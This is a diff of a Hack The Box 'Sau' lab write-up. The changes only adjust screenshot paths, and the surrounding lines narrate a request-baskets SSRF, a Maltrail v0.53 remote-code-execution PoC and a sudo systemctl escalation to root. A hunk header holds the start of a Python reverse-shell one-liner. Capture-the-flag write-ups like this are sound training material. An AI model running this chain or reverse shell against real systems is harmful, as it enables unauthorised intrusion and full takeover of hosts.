@@ -58,7 +58,7 @@ lets check the web page on port 55555
 
 ## Enumerating
 
-![img1](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126114027.png)
+![](screen/Pasted%20image%2020251126114027.png)
 
 checking the wep app we di scover the fact that is powered by request-baskets version 1.2.1
 
@@ -76,7 +76,7 @@ _The API endpoints /api/baskets/{name}, /baskets/{name} are vulnerable to unauth
 
 so we first create a basket , and change the options of it
 
-![](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126114602.png)
+![](screen/Pasted%20image%2020251126114602.png)
 
 we know the port 80 is filtered so we are gonna proxy our request to that port
 
@@ -90,11 +90,11 @@ wget http://10.10.11.224:55555/fusaiir
 
 after that we open the downloaded file with firefox 
 
-![](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126114927.png)
+![](Sau/screen/Pasted%20image%2020251126114927.png)
 
 we see that the page is running maltrail v0.53 lets on the internet for a public exploit to utilize on the application
 
-![](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126120110.png)
+![](screen/Pasted%20image%2020251126120110.png)
 
 i found this PoC that we can use to gain a reverse shell on the machine 
 
@@ -119,7 +119,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 i started a listener and after running the script i got a connection
 
-![](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126121159.png)
+![](screen/Pasted%20image%2020251126121159.png)
 
 after retrieving the home flag i started doing standard enumeration , starting of sudo privilage and i found this:
 
@@ -139,4 +139,4 @@ i found online that this version of systemctl we can start a shell inside of it 
 
 in fact after running the exploit we got a root shell
 
-![](HTB_tracks/Intro_To_RED_team/Sau/screen/Pasted%20image%2020251126121919.png)
+![](screen/Pasted%20image%2020251126121919.png)
